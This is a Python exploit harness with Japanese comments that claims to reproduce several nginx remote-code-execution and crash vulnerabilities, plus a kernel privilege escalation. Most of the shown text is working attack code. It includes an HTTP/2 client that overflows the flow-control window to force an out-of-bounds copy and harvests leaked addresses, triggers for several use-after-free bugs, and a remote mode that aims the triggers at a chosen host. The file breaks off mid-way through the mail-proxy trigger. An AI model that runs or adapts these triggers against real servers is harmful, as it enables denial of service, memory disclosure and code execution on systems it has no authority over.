#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
nginx2root full-poc.py
======================

https://nginx2root.com/（Xint: "NGINX2Root: New Remote Code Execution Vulnerabilities in nginx"）
で示された 10 件（nginx 9 件 + Linux kernel SCTP 1 件）を、
1 本のスクリプトで「再現・検証」するためのフル PoC ハーネスです。

  nginx 側（1.31.9 で修正 / 1.31.8 以前が脆弱）
    CVE-2026-123007  HTTP/2 フロー制御の整数オーバーフロー → 巨大 memcpy → 制御フロー奪取
    CVE-2026-123634  resolver の UAF（mirror サブリクエスト）
    CVE-2026-123633  HTTP/2 再利用可能接続の UAF（drain 時）
    CVE-2026-121810  HTTP/3 QUIC ストリームの UAF（drain 時）
    CVE-2026-113425  mail proxy auth_http の UAF
    CVE-2026-125283  alias + try_files の script underwrite によるバッファオーバーラン
    CVE-2026-123640  stream ssl_preread の重複 SNI/ALPN 入力検証不足
    CVE-2026-120967  stream の SNI 指定時クライアント証明書検証漏れ
    CVE-2026-120993  PROXY protocol v2 + 動的証明書の NULL 参照 SIGSEGV
    CVE-2026-118899  TLS 1.3 request body 読取中の NGX_AGAIN 無限ループ（100% CPU）
  kernel 側
    SCTP の send 待ち中に association が別 socket へ移動 → double free / UAF
    （KASLR 回避のためのカーネルメモリ開示 + 任意関数呼び出し → root）

うち 125283 / 123640 / 120967 / 120993 / 118899 の 5 件は「modules 専用
エントリ」です（このファイル内にインライン実装が無く、modules/<cve>.py の
run() を経由してのみ実行されます。--no-modules 指定時は SKIP と表示されます）。

使い方（ローカル: build/inst-vuln と build/inst-fixed を自動検出）:
    python3 full-poc.py                 # 1.31.8 に対して 10 件 + kernel を実行
    python3 full-poc.py --compare       # 1.31.8 と 1.31.9 を順に実行して差分表示
    python3 full-poc.py --quick          # 123007 の窓ラップを小予算で差分確認
    python3 full-poc.py --only 123633,113425
    python3 full-poc.py --mode remote --host 192.0.2.10 --tls-port 443

リモート:
    HTTP/2/HTTP/3/mail のポートだけを指定して、設定済みの対象へトリガを送ります。
    123634 は対象側に resolver + request 由来 proxy_pass + mirror の設定が必要です。

注意:
  * 123007 の完全再現は「1 接続あたり約 2^33 個の WINDOW_UPDATE（約 111 GB 受信）」
    が必要です（記事の観測値と一致）。--quick は 2^31 付近までしか進めず、
    「修正版だけが FLOW_CONTROL_ERROR で落ちる」差分を短時間で確認するモードです。
  * 123634/123633/121810/113425 は UAF の「トリガ」と観測（worker の異常終了、
    リーク、応答断）までを自動判定します。記事では最終的な RCE のヒープ整形の
    詳細が省略されているため、RCE 到達は環境依存です（判定は LEAK/CRASH/RCE で表示）。
  * modules 専用エントリ（125283/123640/120967/120993/118899）は
    modules/<cve>.py が nginx.conf の生成・起動・トリガ・停止までを自己完結で
    行います（run_modules 経由）。
  * release 版ではこのファイルの置かれたディレクトリ（ROOT）直下の modules/ を
    使用します。build/（inst-vuln / inst-fixed）は ROOT/build から自動検出します。
    build/ は scripts/build-nginx.sh で再現できるほか、--local-bin で既存の
    nginx バイナリを直接指定することもできます。
"""

import argparse
import errno
import os
import random
import re
import shutil
import signal
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent   # release/nginx2root/（modules/ を同梱）
BUILD = ROOT / "build"                   # scripts/build-nginx.sh で生成（--local-bin で代替可）

C_RESET = "\033[0m"
C_RED = "\033[31m"
C_GRN = "\033[32m"
C_YEL = "\033[33m"
C_CYA = "\033[36m"
C_BLD = "\033[1m"


def color(s, c):
    return s if not sys.stdout.isatty() else c + s + C_RESET


def log(msg, c=None):
    print((c + msg + C_RESET) if c and sys.stdout.isatty() else msg, flush=True)


# ---------------------------------------------------------------------------
# 共通ユーティリティ
# ---------------------------------------------------------------------------

class Result:
    """1 モジュールの実行結果。"""

    def __init__(self, cve, configured, trigger, effect, detail=""):
        self.cve = cve
        self.configured = configured      # 設定が対象に存在するか
        self.trigger = trigger            # トリガ送信の成否/内容
        self.effect = effect              # NONE / LEAK / CRASH / RCE / UAF / SKIP / ERROR
        self.detail = detail

    def line(self):
        return ("{:<15} cfg={:<4} trigger={:<4} effect={:<7} {}"
                .format(self.cve, str(self.configured), str(self.trigger),
                        self.effect, self.detail))


def recv_exact(sock, n, timeout=5.0):
    sock.settimeout(timeout)
    buf = b""
    while len(buf) < n:
        d = sock.recv(n - len(buf))
        if not d:
            raise EOFError("closed")
        buf += d
    return buf


# ---------------------------------------------------------------------------
# 最小 HTTP/2 クライアント（HPACK は非 Huffman リテラルのみ）
# ---------------------------------------------------------------------------

class H2:
    PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    DATA, HEADERS, PRIORITY, RST_STREAM, SETTINGS = 0, 1, 2, 3, 4
    PUSH_PROMISE, PING, GOAWAY, WINDOW_UPDATE, CONTINUATION = 5, 6, 7, 8, 9

    def __init__(self, host, port, tls=True, sni=None, rcvbuf=8192, timeout=5.0):
        self.host, self.port, self.tls = host, port, tls
        self.sni = sni or host
        self.rcvbuf = rcvbuf
        self.timeout = timeout
        self.sock = None

    # --- 接続 ---
    def connect(self):
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, self.rcvbuf)
        raw.settimeout(self.timeout)
        raw.connect((self.host, self.port))
        if self.tls:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2"])
            raw = ctx.wrap_socket(raw, server_hostname=self.sni)
            proto = raw.selected_alpn_protocol()
            if proto != "h2":
                raise RuntimeError("ALPN h2 が選択されませんでした: %r" % (proto,))
        self.sock = raw
        self.sock.sendall(self.PREFACE)
        self.send_settings({})
        return self

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    # --- フレーム送信 ---
    @staticmethod
    def frame(typ, flags, sid, payload=b""):
        return (struct.pack("!I", len(payload))[1:]
                + bytes([typ, flags])
                + struct.pack("!I", sid & 0x7fffffff)
                + payload)

    def send_frame(self, typ, flags, sid, payload=b""):
        self.sock.sendall(self.frame(typ, flags, sid, payload))

    def send_settings(self, params=None):
        payload = b""
        for k, v in (params or {}).items():
            payload += struct.pack("!HI", k, v)
        self.send_frame(self.SETTINGS, 0, 0, payload)

    def ping(self, opaque=b"\x00" * 8, ack=False):
        self.send_frame(self.PING, 1 if ack else 0, 0, opaque)

    def window_update(self, sid, inc):
        self.send_frame(self.WINDOW_UPDATE, 0, sid, struct.pack("!I", inc))

    def rst_stream(self, sid, code=8):
        self.send_frame(self.RST_STREAM, 0, sid, struct.pack("!I", code))

    def goaway_payload_ok(self, payload):
        return len(payload) >= 8

    # --- HPACK ---
    @staticmethod
    def _hpack_int(n, prefix_bits, first=0):
        maxp = (1 << prefix_bits) - 1
        if n < maxp:
            return bytes([first | n])
        out = bytearray([first | maxp])
        n -= maxp
        while n >= 128:
            out.append((n & 0x7f) | 0x80)
            n >>= 7
        out.append(n)
        return bytes(out)

    @classmethod
    def _hpack_str(cls, s):
        b = s.encode() if isinstance(s, str) else s
        return cls._hpack_int(len(b), 7) + b

    @classmethod
    def encode_headers(cls, pairs):
        out = bytearray()
        for k, v in pairs:
            out += b"\x00"                    # literal without indexing, new name
            out += cls._hpack_str(k) + cls._hpack_str(v)
        return bytes(out)

    def headers(self, sid, pairs, end_stream=True, end_headers=True):
        block = self.encode_headers(pairs)
        flags = (0x1 if end_stream else 0) | (0x4 if end_headers else 0)
        self.send_frame(self.HEADERS, flags, sid, block)

    # --- フレーム受信 ---
    def read_frame(self, timeout=None):
        tmo = self.timeout if timeout is None else timeout
        h = recv_exact(self.sock, 9, tmo)
        ln = int.from_bytes(h[0:3], "big")
        typ, flags = h[3], h[4]
        sid = int.from_bytes(h[5:9], "big") & 0x7fffffff
        payload = recv_exact(self.sock, ln, tmo) if ln else b""
        return typ, flags, sid, payload

    def drain(self, seconds, auto_ack=True):
        """指定秒数読み続け、受信フレームを (typ, sid, payload) で返す。"""
        end = time.time() + seconds
        out = []
        while time.time() < end:
            try:
                typ, flags, sid, payload = self.read_frame(max(0.05, end - time.time()))
            except (socket.timeout, TimeoutError):
                continue
            except (EOFError, ConnectionError, ssl.SSLError, OSError):
                break
            if auto_ack and typ == self.SETTINGS and not (flags & 1):
                self.send_frame(self.SETTINGS, 1, 0)
            if auto_ack and typ == self.PING and not (flags & 1):
                self.send_frame(self.PING, 1, 0, payload)
            out.append((typ, sid, payload))
        return out

    # --- 大量 WINDOW_UPDATE（123007 用） ---
    def wu_burst(self, inc, total_bytes, chunk_bytes=4 << 20, progress=None, sid=0):
        """sid へ inc を total_bytes 分だけ送る。inc は 2^31-1 以下。"""
        one = self.frame(self.WINDOW_UPDATE, 0, sid, struct.pack("!I", inc))
        per = max(1, chunk_bytes // len(one))
        chunk = one * per
        chunk_len = len(chunk)
        sent = 0
        last = 0
        while sent < total_bytes:
            n = min(chunk_len, total_bytes - sent)
            self.sock.sendall(chunk if n == chunk_len else chunk[:n])
            sent += n
            if progress and sent - last >= (1 << 30):
                progress(sent)
                last = sent
        return sent


# ---------------------------------------------------------------------------
# 補助サーバ（HTTP バックエンド / DNS / auth_http / mail バックエンド）
# ---------------------------------------------------------------------------

class _TCPServer(threading.Thread):
    def __init__(self, host, port, handler, name):
        super().__init__(daemon=True, name=name)
        self.host, self.port, self.handler = host, port, handler
        self.sock = None
        self.running = True

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.host, self.port))
        s.listen(128)
        s.settimeout(0.3)
        self.sock = s
        while self.running:
            try:
                c, a = s.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._wrap, args=(c, a), daemon=True).start()
        try:
            s.close()
        except OSError:
            pass

    def _wrap(self, c, a):
        try:
            self.handler(c, a)
        except Exception:
            pass
        finally:
            try:
                c.close()
            except OSError:
                pass

    def stop(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass


def http_backend_handler(c, a):
    c.settimeout(3)
    req = b""
    try:
        while b"\r\n\r\n" not in req:
            d = c.recv(4096)
            if not d:
                return
            req += d
    except OSError:
        return
    body = b"B" * 65536
    c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % len(body) + body)


class DNSResponder(threading.Thread):
    """UDP DNS。mode='nxdomain' または 'a'。hold=True の間は応答を保留する。"""

    def __init__(self, host, port, mode="nxdomain", delay=0.0):
        super().__init__(daemon=True, name="dns")
        self.host, self.port, self.mode, self.delay = host, port, mode, delay
        self.query_event = threading.Event()
        self.answered = 0
        self.sock = None
        self.running = True

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.host, self.port))
        s.settimeout(0.3)
        self.sock = s
        while self.running:
            try:
                q, addr = s.recvfrom(2048)
            except socket.timeout:
                continue
            except OSError:
                break
            self.query_event.set()
            if self.delay:
                time.sleep(self.delay)
            try:
                s.sendto(self._reply(q), addr)
                self.answered += 1
            except OSError:
                pass
        try:
            s.close()
        except OSError:
            pass

    def _reply(self, q):
        tid = q[:2]
        # 質問をそのままコピー（1 問のみ想定）
        i = 12
        while i < len(q) and q[i] != 0:
            i += 1 + q[i]
        i += 1
        question = q[12:i + 4]
        flags = b"\x81\x83" if self.mode == "nxdomain" else b"\x81\x80"
        if self.mode == "nxdomain":
            return tid + flags + b"\x00\x01\x00\x00\x00\x00\x00\x00" + question
        # A 127.0.0.1
        ans = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 60, 4) + socket.inet_aton("127.0.0.1")
        return tid + flags + b"\x00\x01\x00\x01\x00\x00\x00\x00" + question + ans

    def stop(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass


class AuthHTTPServer(_TCPServer):
    def __init__(self, host, port, backend_port, delay=0.3):
        self.backend_port = backend_port
        self.delay = delay
        self.requests = 0
        super().__init__(host, port, self.handle, "auth_http")

    def handle(self, c, a):
        c.settimeout(3)
        data = b""
        try:
            while b"\r\n\r\n" not in data:
                d = c.recv(4096)
                if not d:
                    return
                data += d
        except OSError:
            return
        self.requests += 1
        time.sleep(self.delay)
        body = ("HTTP/1.0 200 OK\r\n"
                "Auth-Status: OK\r\n"
                "Auth-Server: 127.0.0.1\r\n"
                "Auth-Port: %d\r\n"
                "Content-Length: 0\r\n\r\n" % self.backend_port).encode()
        try:
            c.sendall(body)
        except OSError:
            pass


def mail_backend_handler(c, a):
    try:
        c.sendall(b"+OK fake pop3 ready\r\n")
        c.settimeout(5)
        while True:
            d = c.recv(4096)
            if not d:
                return
            c.sendall(b"+OK\r\n")
    except OSError:
        return


class Servers:
    """補助サーバ一式を起動/停止する。"""

    def __init__(self, host="127.0.0.1", http_port=19000, dns_port=15353,
                 auth_port=19001, mail_port=21210):
        self.host = host
        self.http_port = http_port
        self.dns_port = dns_port
        self.auth_port = auth_port
        self.mail_port = mail_port
        self.objs = []

    def start(self):
        self.objs = [
            _TCPServer(self.host, self.http_port, http_backend_handler, "http"),
            DNSResponder(self.host, self.dns_port, "nxdomain"),
            AuthHTTPServer(self.host, self.auth_port, self.mail_port, delay=0.3),
            _TCPServer(self.host, self.mail_port, mail_backend_handler, "mail"),
        ]
        for o in self.objs:
            o.start()
        time.sleep(0.2)
        return self

    @property
    def dns(self):
        return self.objs[1]

    def stop(self):
        for o in self.objs:
            o.stop()


# ---------------------------------------------------------------------------
# ローカル nginx インスタンス
# ---------------------------------------------------------------------------

class NginxEnv:
    PORTS = dict(h2=18443, h2proxy=18444, h1=18445, quic=18446,
                 pop3=21110, imap=21143, smtp=21025)

    def __init__(self, binary, tag, build_dir):
        self.binary = Path(binary)
        self.tag = tag
        self.build_dir = Path(build_dir)
        self.prefix = ROOT / ("poc-run-" + tag)
        self.conf = self.prefix / "nginx.conf"
        self.errlog = self.prefix / "logs" / "error.log"
        self.pidfile = self.prefix / "nginx.pid"
        self.cert = self.prefix / "certs" / "cert.pem"
        self.key = self.prefix / "certs" / "key.pem"
        self.html = self.prefix / "html"
        self.features = {}
        self.proc = None
        self.crash_lines = []

    # --- nginx -V による機能判定 ---
    def detect(self):
        try:
            out = subprocess.run([str(self.binary), "-V"], capture_output=True,
                                 text=True, timeout=10)
            v = (out.stdout or "") + (out.stderr or "")
        except Exception as e:
            raise RuntimeError("nginx -V 実行失敗: %s" % e)
        self.features["v3"] = "--with-http_v3_module" in v
        self.features["v2"] = "--with-http_v2_module" in v
        self.features["mail"] = "--with-mail" in v
        self.features["version"] = re.search(r"nginx/([\d.]+)", v)
        self.features["version"] = self.features["version"].group(1) if self.features["version"] else "?"
        return self.features

    # --- セットアップ ---
    def setup(self):
        if self.prefix.exists():
            shutil.rmtree(self.prefix)
        for d in ["logs", "html", "certs", "tmp/client", "tmp/proxy", "tmp/fastcgi",
                  "tmp/uwsgi", "tmp/scgi"]:
            (self.prefix / d).mkdir(parents=True, exist_ok=True)

        # 自己署名証明書
        subprocess.run(
            ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "2",
             "-keyout", str(self.key), "-out", str(self.cert),
             "-subj", "/CN=localhost",
             "-addext", "subjectAltName=DNS:localhost,DNS:evil.test,IP:127.0.0.1"],
            check=True, capture_output=True)
        os.chmod(self.cert, 0o644)
        os.chmod(self.key, 0o644)

        # Range 用の大きいファイル
        with open(self.html / "big.bin", "wb") as f:
            f.truncate(8 << 20)
        (self.html / "index.html").write_text("nginx2root\n")

        self.write_conf()

    def write_conf(self):
        p = self.PORTS
        pf = str(self.prefix)
        ssl_lines = (
            "        ssl_certificate     {pf}/certs/cert.pem;\n"
            "        ssl_certificate_key {pf}/certs/key.pem;\n"
            "        ssl_protocols       TLSv1.2 TLSv1.3;\n").format(pf=pf)
        h3_server = ""
        if self.features.get("v3"):
            h3_server = """
    server {{
        listen 127.0.0.1:{quic} quic reuseport;
        http3 on;
{ssl}        location / {{ proxy_pass http://127.0.0.1:19000; }}
        add_header Alt-Svc 'h3=":{quic}"; ma=60' always;
    }}""".format(quic=p["quic"], ssl=ssl_lines)

        mail_block = ""
        if self.features.get("mail"):
            mail_block = """
mail {{
    auth_http 127.0.0.1:19001/auth;
    proxy on;
    server {{ listen 127.0.0.1:{pop3}; protocol pop3; }}
    server {{ listen 127.0.0.1:{imap}; protocol imap; }}
    server {{ listen 127.0.0.1:{smtp}; protocol smtp; }}
}}""".format(**p)

        conf = """\
worker_processes 1;
daemon on;
pid {pf}/nginx.pid;
error_log {pf}/logs/error.log info;

events {{ worker_connections 64; }}

http {{
    access_log off;
    client_body_temp_path {pf}/tmp/client;
    proxy_temp_path {pf}/tmp/proxy;
    fastcgi_temp_path {pf}/tmp/fastcgi;
    uwsgi_temp_path {pf}/tmp/uwsgi;
    scgi_temp_path {pf}/tmp/scgi;

    # CVE-2026-123634 用（リクエスト時の名前解決）
    resolver 127.0.0.1:15353 ipv6=off valid=1s;

    # CVE-2026-123007: 静的ファイル + Range（OOB コピー/リーク用）
    server {{
        listen 127.0.0.1:{h2} ssl;
        http2 on;
{ssl}        root {pf}/html;
        location / {{ }}
    }}

    # CVE-2026-123633: upstream への転送（drain を誘発）
    server {{
        listen 127.0.0.1:{h2proxy} ssl;
        http2 on;
{ssl}        location / {{ proxy_pass http://127.0.0.1:19000; }}
    }}

    # CVE-2026-123634: 変数 proxy_pass + mirror（同一 upstream 名を main と mirror が解決）
    server {{
        listen 127.0.0.1:{h1};
        location / {{
            mirror /mirror;
            mirror_request_body off;
            proxy_pass http://$host:19000;
        }}
        location = /mirror {{
            internal;
            proxy_pass http://$host:19000;
        }}
    }}
{h3}
}}

{mail}
""".format(pf=pf, ssl=ssl_lines, h2=p["h2"], h2proxy=p["h2proxy"],
           h1=p["h1"], h3=h3_server, mail=mail_block)
        self.conf.write_text(conf)

    # --- 起動/停止 ---
    def start(self):
        self.errlog.write_text("")
        r = subprocess.run([str(self.binary), "-p", str(self.prefix) + "/",
                            "-c", str(self.conf)],
                           capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError("nginx 起動失敗:\n" + (r.stderr or r.stdout))
        self.proc = None
        # ポート待ち
        for _ in range(50):
            if self._port_open(self.PORTS["h2"]):
                return self
            time.sleep(0.1)
        raise RuntimeError("nginx の 18443 が開きません")

    @staticmethod
    def _port_open(port, host="127.0.0.1"):
        s = socket.socket()
        s.settimeout(0.2)
        try:
            s.connect((host, port))
            return True
        except OSError:
            return False
        finally:
            s.close()

    def stop(self):
        try:
            pid = int(self.pidfile.read_text().strip())
        except Exception:
            pid = None
        if pid:
            for sig in (signal.SIGTERM, signal.SIGKILL):
                try:
                    os.kill(pid, sig)
                except ProcessLookupError:
                    break
                time.sleep(0.3)
                try:
                    os.kill(pid, 0)
                except ProcessLookupError:
                    break
        # 念のため残存 worker を掃除（pkill 非搭載環境向けに /proc を走査）
        _kill_by_cmdline(str(self.prefix))
        self.crash_lines = self.scan_crash()

    def scan_crash(self):
        try:
            txt = self.errlog.read_text(errors="ignore")
        except OSError:
            return []
        pats = [r"worker process \d+ exited on signal \d+",
                r"worker process \d+ exited with code",
                r"segmentation fault"]
        out = []
        for line in txt.splitlines():
            for p in pats:
                if re.search(p, line):
                    out.append(line.strip())
                    break
        return out

    def crashed(self):
        return self.scan_crash()


# ---------------------------------------------------------------------------
# 各 CVE のトリガ
# ---------------------------------------------------------------------------

def cve_123007(env, args):
    """HTTP/2 フロー制御の整数オーバーフロー → 巨大 memcpy → OOB read/write。"""
    p = env.PORTS
    host = "127.0.0.1"
    budget = int(args.wu_budget_gb * (1 << 30)) if not args.quick else int(0.25 * (1 << 30))
    WMAX = 0x7fffffff
    nstreams = 12
    body = 262144
    Q = nstreams * body

    try:
        h2 = H2(host, p["h2"], tls=True, sni="localhost", rcvbuf=8192, timeout=8).connect()
    except Exception as e:
        return Result("CVE-2026-123007", True, False, "ERROR", "接続失敗: %s" % e)

    try:
        # 1) 接続ウィンドウを最大へ、新規ストリームの初期ウィンドウは 0
        h2.send_settings({0x4: 0})            # SETTINGS_INITIAL_WINDOW_SIZE = 0
        h2.window_update(0, WMAX - 65535)

        # 2) レスポンスをキューさせる（Range で本文長を固定 = Q を既知に）
        sids = []
        for i in range(nstreams):
            sid = 1 + 2 * i
            h2.headers(sid, [
                (":method", "GET"), (":path", "/big.bin"),
                (":scheme", "https"), (":authority", "localhost"),
                ("range", "bytes=0-%d" % (body - 1)),
                ("cookie", "A" * (96 + i)),
            ])
            sids.append(sid)

        # 3) PING で ACK を出力させ、TLS/TCP 送信バッファを埋める（P の調整）
        pings = args.pings
        for i in range(pings):
            h2.ping(struct.pack("!Q", i))
        time.sleep(0.2)

        # 4) 各ストリームに本文ぶんのウィンドウを与えて DATA をキューさせる
        for sid in sids:
            h2.window_update(sid, body)
        time.sleep(0.3)

        # 5) 窓を Wmax 超へ押し上げる:
        #    x は「まだ送られていないキュー済みバイト数」以下である必要がある。
        #    WU(0,x) の直後に RST_STREAM でキュー済みフレームを破棄すると、
        #    cleanup が同じバイト数を二重に戻すため send_window = Wmax + x になる
        #    （1.31.9 は send_queued を差し引くので、この WU 自体が拒否される）。
        X = 65536
        try:
            h2.window_update(0, X)
            for sid in sids:
                h2.rst_stream(sid, 8)         # CANCEL
            time.sleep(0.2)
        except (BrokenPipeError, ConnectionResetError, ssl.SSLError, OSError) as e:
            frames = []
            try:
                frames = h2.drain(0.3)
            except Exception:
                pass
            goaway = [x for x in frames if x[0] == H2.GOAWAY]
            if goaway and len(goaway[0][2]) >= 8:
                code = struct.unpack("!I", goaway[0][2][4:8])[0]
                return Result("CVE-2026-123007", True, True, "FLOWCTRL",
                              "WU(0,%d) で GOAWAY error_code=%d（修正版の拒否）" % (X, code))
            return Result("CVE-2026-123007", True, True, "CLOSED",
                          "WU(0,%d) 直後に接続断（修正版の拒否と推定）: %s" % (X, e))

        # 6) 送信ウィンドウを 2^64 - D まで拡大する
        #    クリーンアップで戻る量には最大 1 フレーム（16KB）の未確定分があり、
        #    最終的な負値は -(D + 未確定分) になる。D はその分を見込んで大きめにする。
        D = args.leak_back
        target = (1 << 64) - D
        cur = WMAX + X
        rem = (target - cur) & ((1 << 64) - 1)
        inc = 0x7fffffff

        def prog(sent):
            log("    [123007] WINDOW_UPDATE 送信 %6.1f GB / %6.1f GB"
                % (sent / 1e9, budget / 1e9), C_CYA)

        sent = 0
        try:
            sent = h2.wu_burst(inc, min(rem, budget), progress=prog)
        except (BrokenPipeError, ConnectionResetError, ssl.SSLError, OSError) as e:
            frames = []
            try:
                frames = h2.drain(0.3)
            except Exception:
                pass
            goaway = [x for x in frames if x[0] == H2.GOAWAY]
            if goaway and len(goaway[0][2]) >= 8:
                code = struct.unpack("!I", goaway[0][2][4:8])[0]
                return Result("CVE-2026-123007", True, True, "FLOWCTRL",
                              "GOAWAY error_code=%d（送信 %0.1f GB で拒否）" % (code, sent / 1e9))
            return Result("CVE-2026-123007", True, True, "CLOSED",
                          "WU 中に接続断（修正版の拒否と推定）: %s" % e)

        if rem > budget:
            # 予算不足（--quick）: ここまでの受理状況で差分を判定する
            frames = h2.drain(0.5)
            goaway = [x for x in frames if x[0] == H2.GOAWAY]
            if goaway and len(goaway[0][2]) >= 8:
                code = struct.unpack("!I", goaway[0][2][4:8])[0]
                return Result("CVE-2026-123007", True, True, "FLOWCTRL",
                              "GOAWAY error_code=%d（送信 %0.1f GB で拒否）" % (code, sent / 1e9))
            return Result("CVE-2026-123007", True, True, "ACCEPT",
                          "上限超過後も WU を受理（送信 %0.1f GB、完全ラップは %.0f GB）"
                          % (sent / 1e9, rem / 1e9))

        # 7) 窓が 2^64-D になった状態で本文送信 → 巨大 memcpy（OOB コピー）
        sid = 1 + 2 * nstreams
        h2.headers(sid, [
            (":method", "GET"), (":path", "/big.bin"),
            (":scheme", "https"), (":authority", "localhost"),
            ("range", "bytes=0-1048575"),
            ("cookie", "B" * 128),
        ])
        h2.window_update(sid, 1 << 20)

        frames = h2.drain(2.0)
        body_bytes = b"".join(pl for (t, s, pl) in frames if t == H2.DATA)
        leaks = find_leaks(body_bytes)
        crash = bool(frames) and any(t == H2.GOAWAY for (t, s, pl) in frames)

        if leaks:
            return Result("CVE-2026-123007", True, True, "LEAK",
                          "OOB コピーでアドレス %d 個を開示（例 %s）"
                          % (len(leaks), ", ".join("0x%x" % x for x in leaks[:3])))
        if not body_bytes:
            return Result("CVE-2026-123007", True, True, "CRASH",
                          "巨大コピー後に応答なし（worker 異常終了の可能性）")
        return Result("CVE-2026-123007", True, True, "TRIGGERED",
                      "窓を 2^64-%d まで拡大し巨大コピーを発火（リーク未検出）" % D)
    finally:
        h2.close()


def find_leaks(buf):
    """応答本文から 8 バイトの正準アドレスらしき値を拾う。"""
    out = []
    for i in range(0, max(0, len(buf) - 8)):
        v = struct.unpack_from("<Q", buf, i)[0]
        if 0x550000000000 <= v <= 0x7fffffffffff:
            if v & 0xfff and (v >> 40) in (0x55, 0x56, 0x7f):
                out.append(v)
    # 重複排除しつつ出現順
    seen, uniq = set(), []
    for v in out:
        if v not in seen:
            seen.add(v)
            uniq.append(v)
    return uniq[:8]


def cve_123634(env, args):
    """resolver の UAF: main と mirror が同一名を解決中に main を終了させる。"""
    p = env.PORTS
    host = "127.0.0.1"
    tries = 30
    sent = 0
    for _ in range(tries):
        try:
            s = socket.create_connection((host, p["h1"]), timeout=3)
        except OSError as e:
            return Result("CVE-2026-123634", True, False, "ERROR", "接続失敗: %s" % e)
        try:
            # main と mirror の両方が evil.test を解決待ちになる
            s.sendall(b"GET / HTTP/1.1\r\nHost: evil.test\r\n"
                      b"Connection: close\r\n\r\n")
            time.sleep(0.02)
            # DNS 応答で main が 502 を書く前に RST で切断 → terminate → mirror ctx 解放
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                         struct.pack("ii", 1, 0))
            s.close()
            sent += 1
            time.sleep(0.05)
        except OSError:
            pass
    time.sleep(0.5)
    crash = env.crashed()
    if crash:
        return Result("CVE-2026-123634", True, True, "CRASH", crash[-1])
    return Result("CVE-2026-123634", True, True, "TRIGGERED",
                  "%d 回の main+mirror 同時解決 → RST（worker 異常終了は未観測）" % sent)


def cve_123633(env, args):
    """HTTP/2 再利用可能接続の UAF（drain が自分の接続を閉じる）。"""
    p = env.PORTS
    host = "127.0.0.1"

    # HTTP/1 の keep-alive 接続で worker_connections を埋める
    keep = []
    for _ in range(20):
        try:
            k = socket.create_connection((host, p["h1"]), timeout=2)
            k.sendall(b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
            keep.append(k)
        except OSError:
            pass
    time.sleep(0.2)

    try:
        h2 = H2(host, p["h2proxy"], tls=True, sni="localhost", rcvbuf=8192).connect()
    except Exception as e:
        for k in keep:
            k.close()
        return Result("CVE-2026-123633", True, False, "ERROR", "h2 接続失敗: %s" % e)

    try:
        # 不完全な HEADERS で接続を reusable キューへ入れる
        block = h2.encode_headers([
            (":method", "GET"), (":path", "/"), (":scheme", "https"),
            (":authority", "localhost"),
        ])
        first = block[:3]
        rest = block[3:]
        h2.send_frame(H2.HEADERS, 0x4, 1, first)     # END_HEADERS なし・途中まで
        time.sleep(0.05)
        # 残りを送ってストリーム作成 → upstream connect → drain がこの接続を選択
        h2.send_frame(H2.CONTINUATION, 0x5, 1, rest)  # END_HEADERS|END_STREAM
        # GOAWAY の書き込みを失敗させるため即 RST
        h2.sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                           struct.pack("ii", 1, 0))
        h2.sock.close()
        h2.sock = None
        time.sleep(0.5)
        crash = env.crashed()
        if crash:
            return Result("CVE-2026-123633", True, True, "CRASH", crash[-1])
        return Result("CVE-2026-123633", True, True, "TRIGGERED",
                      "partial HEADERS → 残り → RST（drain で自接続を close）")
    finally:
        for k in keep:
            k.close()
        h2.close()


def cve_121810(env, args):
    """HTTP/3 (QUIC) のストリーム生成中の drain による UAF。"""
    p = env.PORTS
    if not env.features.get("v3"):
        return Result("CVE-2026-121810", False, False, "SKIP", "ビルドに HTTP/3 が無い")
    try:
        import asyncio
        from aioquic.asyncio.client import connect
        from aioquic.quic.configuration import QuicConfiguration
        from aioquic.h3.connection import H3_ALPN
    except Exception:
        return Result("CVE-2026-121810", True, False, "SKIP",
                      "aioquic 未導入（pip install aioquic）")

    async def run():
        cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
        cfg.verify_mode = ssl.CERT_NONE
        async with connect("127.0.0.1", p["quic"], configuration=cfg) as client:
            await client.wait_connected()
            q = client._quic
            # ヘッダ待ちのストリームを多数作り、片方を閉じて can_shutdown を誘発
            sids = []
            for i in range(6):
                sid = q.get_next_available_stream_id()
                q.send_headers(sid, [(b":method", b"GET"), (b":path", b"/"),
                                     (b":scheme", b"https"), (b":authority", b"localhost")],
                               end_stream=True)
                sids.append(sid)
                client.transmit()
            for sid in sids[:-1]:
                try:
                    q.reset_stream(sid)
                except Exception:
                    pass
            client.transmit()
            await asyncio.sleep(0.5)

    try:
        import asyncio
        asyncio.run(run())
    except Exception as e:
        return Result("CVE-2026-121810", True, True, "ERROR", "QUIC 例外: %s" % e)
    time.sleep(0.4)
    crash = env.crashed()
    if crash:
        return Result("CVE-2026-121810", True, True, "CRASH", crash[-1])
    return Result("CVE-2026-121810", True, True, "TRIGGERED",
                  "QUIC 接続で複数ストリーム生成 + reset（drain 誘発）")


def cve_113425(env, args):
